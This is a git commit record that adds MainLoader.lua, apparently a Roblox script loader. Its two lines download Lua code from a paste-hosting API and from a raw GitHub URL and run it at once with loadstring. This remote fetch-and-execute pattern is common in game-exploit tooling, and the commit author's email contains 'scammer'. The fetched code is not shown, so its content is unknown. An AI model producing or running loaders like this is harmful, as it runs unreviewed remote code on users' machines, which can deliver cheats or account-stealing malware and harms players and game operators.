90e22200df122bb2c9d74db719285a852c841286
terist999 <xscammer25@gmail.com>
2025-07-27 09:41:48 +0800

    Create MainLoader.lua

---
+++ MainLoader.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/as1An286PnXVBHNd/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
